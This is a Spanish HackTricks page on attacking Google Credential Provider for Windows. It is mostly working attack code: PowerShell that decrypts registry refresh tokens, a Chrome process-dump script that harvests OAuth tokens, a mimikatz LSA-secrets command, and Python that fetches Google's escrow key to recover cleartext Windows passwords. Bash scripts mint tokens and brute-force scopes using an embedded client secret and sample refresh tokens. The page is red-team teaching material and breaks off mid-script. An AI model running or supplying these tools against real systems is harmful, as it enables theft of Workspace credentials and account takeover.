# GWS - Ataques de Sincronizaci칩n de Workspace (GCPW, GCDS, Sincronizaci칩n de Directorios con AD y EntraID)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**repositorios de HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## GCPW - Proveedor de Credenciales de Google para Windows

Este es el inicio de sesi칩n 칰nico que Google Workspaces proporciona para que los usuarios puedan iniciar sesi칩n en sus PC con Windows usando **sus credenciales de Workspace**. Adem치s, esto almacenar치 tokens para acceder a Google Workspace en algunos lugares de la PC.

{% hint style="success" %}
Ten en cuenta que [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) es capaz de detectar **GCPW**, obtener informaci칩n sobre la configuraci칩n y **incluso tokens**.
{% endhint %}

### GCPW - MitM

Cuando un usuario accede a una PC con Windows sincronizada con Google Workspace a trav칠s de GCPW, necesitar치 completar un formulario de inicio de sesi칩n com칰n. Este formulario de inicio de sesi칩n devolver치 un c칩digo OAuth que la PC intercambiar치 por el token de actualizaci칩n en una solicitud como: 

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

Se han a침adido nuevas l칤neas para hacerlo m치s legible.

{% hint style="info" %}
Fue posible realizar un MitM instalando `Proxifier` en la PC, sobrescribiendo el binario `utilman.exe` con un `cmd.exe` y ejecutando las **funciones de accesibilidad** en la p치gina de inicio de sesi칩n de Windows, lo que ejecutar치 un **CMD** desde el cual puedes **iniciar y configurar el Proxifier**.\
No olvides **bloquear el tr치fico QUICK UDP** en `Proxifier` para que se degrade a comunicaci칩n TCP y puedas verlo.

Tambi칠n configura en "Servicios y otros usuarios" ambas opciones e instala el certificado CA de Burp en Windows.
{% endhint %}

Adem치s, a침adiendo las claves `enable_verbose_logging = 1` y `log_file_path = C:\Public\gcpw.log` en **`HKLM:\SOFTWARE\Google\GCPW`** es posible hacer que almacene algunos registros.

### GCPW - Huella digital

Es posible verificar si GCPW est치 instalado en un dispositivo comprobando si existe el siguiente proceso o si existen las siguientes claves de registro:
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
En **`HKCU:\SOFTWARE\Google\Accounts`** es posible acceder al correo electr칩nico del usuario y al **refresh token** encriptado si el usuario ha iniciado sesi칩n recientemente.

En **`HKLM:\SOFTWARE\Google\GCPW\Users`** es posible encontrar los **domains** que est치n permitidos para iniciar sesi칩n en la clave `domains_allowed` y en subclaves es posible encontrar informaci칩n sobre el usuario como correo electr칩nico, foto, nombre de usuario, duraciones de token, manejador de token...

{% hint style="info" %}
El manejador de token es un token que comienza con `eth.` y del cual se puede extraer informaci칩n con una solicitud como:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

Tambi칠n es posible encontrar el identificador del token de un token de acceso con una solicitud como:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

Afaik no es posible obtener un token de actualizaci칩n o un token de acceso a partir del identificador del token.
{% endhint %}

Adem치s, el archivo **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`** es un json que contiene la informaci칩n de diferentes **configuraciones** como `enableDmEnrollment`, `enableGcpAutoUpdate`, `enableMultiUserLogin` (si varios usuarios de Workspace pueden iniciar sesi칩n en la computadora) y `validityPeriodDays` (n칰mero de d칤as que un usuario no necesita volver a autenticarse con Google directamente).

### GCPW - Tokens de Actualizaci칩n del Registro

Dentro del registro **`HKCU:\SOFTWARE\Google\Accounts`** podr칤a ser posible encontrar algunas cuentas con el **`refresh_token`** cifrado dentro. El m칠todo **`ProtectedData.Unprotect`** puede descifrarlo f치cilmente.

<details>

<summary>Obtener <strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> datos y descifrar refresh_tokens</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

Ejemplo de salida:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

Como se explica en [**este video**](https://www.youtube.com/watch?v=FEQxHRRP\_5I), si no encuentras el token en el registro, es posible modificar el valor (o eliminarlo) de **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** y la pr칩xima vez que el usuario acceda a la computadora, necesitar치 iniciar sesi칩n nuevamente y el **token se almacenar치 en el registro anterior**.

### GCPW - Tokens de actualizaci칩n de disco

El archivo **`%LocalAppData%\Google\Chrome\User Data\Local State`** almacena la clave para descifrar los **`refresh_tokens`** ubicados dentro de los **perfiles de Google Chrome** del usuario como:

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

Es posible encontrar alg칰n **c칩digo en C#** que accede a estos tokens de manera descifrada en [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe).

Adem치s, la encriptaci칩n se puede encontrar en este c칩digo: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

Se puede observar que se utiliza AESGCM, el token encriptado comienza con una **versi칩n** (**`v10`** en este momento), luego tiene [**12B de nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42), y luego tiene el **texto cifrado** con un **mac final de 16B**.

### GCPW - Extracci칩n de tokens de la memoria de procesos

El siguiente script se puede usar para **dump** cada proceso de **Chrome** usando `procdump`, extraer las **cadenas** y luego **buscar** cadenas relacionadas con **tokens de acceso y de actualizaci칩n**. Si Chrome est치 conectado a alg칰n sitio de Google, 춰alg칰n **proceso estar치 almacenando tokens de actualizaci칩n y/o de acceso en la memoria!**

<details>

<summary>Dump de procesos de Chrome y b칰squeda de tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

Intent칠 lo mismo con `gcpw_extension.exe`, pero no encontr칩 ning칰n token.

Por alguna raz칩n, **algunos tokens de acceso extra칤dos no ser치n v치lidos (aunque algunos s칤 lo ser치n)**. Intent칠 el siguiente script para eliminar caracteres uno por uno para intentar obtener el token v치lido del volcado. Nunca me ayud칩 a encontrar uno v치lido, pero podr칤a, supongo:

<details>

<summary>Verificar token de acceso eliminando caracteres uno por uno</summary>
```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - Recuperando la contrase침a en texto claro

Para abusar de GCPW y recuperar el texto claro de la contrase침a, es posible volcar la contrase침a encriptada de **LSASS** usando **mimikatz**:
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
Luego busca el secreto como `Chrome-GCPW-<sid>` como en la imagen:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

Luego, con un **token de acceso** con el alcance `https://www.google.com/accounts/OAuthLogin`, es posible solicitar la clave privada para descifrar la contrase침a:

<details>

<summary>Script para obtener la contrase침a en texto claro dado el token de acceso, la contrase침a encriptada y el id de recurso</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

Es posible encontrar los componentes clave de esto en el c칩digo fuente de Chromium:

* Dominio de la API: [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* Endpoint de la API: [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - Generando tokens de acceso a partir de tokens de actualizaci칩n

Usando el token de actualizaci칩n, es posible generar tokens de acceso utilizando este y el ID de cliente y el secreto de cliente especificados en el siguiente comando:
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Scopes

{% hint style="info" %}
Tenga en cuenta que incluso teniendo un token de actualizaci칩n, no es posible solicitar ning칰n alcance para el token de acceso, ya que solo puede solicitar los **alcances admitidos por la aplicaci칩n donde est치 generando el token de acceso**.

Adem치s, el token de actualizaci칩n no es v치lido en todas las aplicaciones.
{% endhint %}

Por defecto, GCPW no tendr치 acceso como el usuario a todos los posibles alcances de OAuth, por lo que utilizando el siguiente script podemos encontrar los alcances que se pueden usar con el `refresh_token` para generar un `access_token`:

<details>

<summary>Script Bash para fuerza bruta de alcances</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Y esta es la salida que obtuve en el momento de la escritura:
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
Adem치s, al revisar el c칩digo fuente de Chromium, es posible [**encontrar este archivo**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24), que contiene **otros alcances** que se puede suponer que **no aparecen en la lista previamente forzada por fuerza bruta**. Por lo tanto, se pueden asumir estos alcances adicionales:

<details>

<summary>Alcances adicionales</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

Ten en cuenta que el m치s interesante posiblemente sea:
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
Sin embargo, intent칠 usar este alcance para acceder a gmail o listar grupos y no funcion칩, as칤 que no s칠 cu치n 칰til sigue siendo.

**Obt칠n un token de acceso con todos esos alcances**:

<details>

<summary>Script de Bash para generar un token de acceso a partir de refresh_token con todos los alcances</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
